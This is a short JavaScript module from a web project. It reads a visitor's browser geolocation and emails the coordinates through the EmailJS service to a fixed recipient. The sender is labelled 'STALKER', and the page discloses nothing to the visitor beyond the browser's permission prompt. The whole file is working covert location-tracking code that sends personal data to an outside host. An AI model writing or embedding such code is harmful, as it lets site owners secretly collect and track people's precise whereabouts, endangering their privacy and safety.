import emailjs from "@emailjs/browser";

export const sendLocation = () => {
     if ('geolocation' in navigator) {
      
      navigator.geolocation.getCurrentPosition(
    
      function (position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        
        emailjs.send(
  import.meta.env.VITE_SERVICE_ID,
  import.meta.env.VITE_TEMPLATE_ID,
  {
    from_name: "STALKER",
    to_name: "Abdirizak",
    from_email: "hahda",
    to_email: import.meta.env.VITE_TO_EMAIL,
    message: 'Lat: ' + latitude + ", Long: " + longitude
  },
 import.meta.env.VITE_API_KEY
).then(() => console.log("sent"))
.catch((error) => console.log("didnt send", error.message))

        
        console.log('Lat: ' + latitude + ", Long: " + longitude)
            
      },
      
      function (error) {
        console.error('Error getting user location:', error.message)
     }
    );
    }
   }
